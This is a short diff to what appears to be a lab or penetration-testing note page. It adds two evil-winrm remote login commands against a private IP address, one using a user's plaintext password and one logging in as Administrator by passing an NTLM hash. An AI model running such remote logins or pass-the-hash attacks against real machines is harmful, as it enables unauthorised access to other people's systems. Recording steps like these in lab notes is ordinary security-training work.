@@ -1,11 +1,12 @@
 [[Editing Copy Page]]
 
 ```
-
+evil-winrm -i 192.168.123.206 -u 'r.andrews' -p 'BusyOfficeWorker890'
 ```
 
+MS01 administrator evilwinrm login
 ```
-
+evil-winrm -i 192.168.123.206 -u 'Administrator' -H '2a00a0a55d5a916e79c91ad30e770715'
 ```
 
 ```
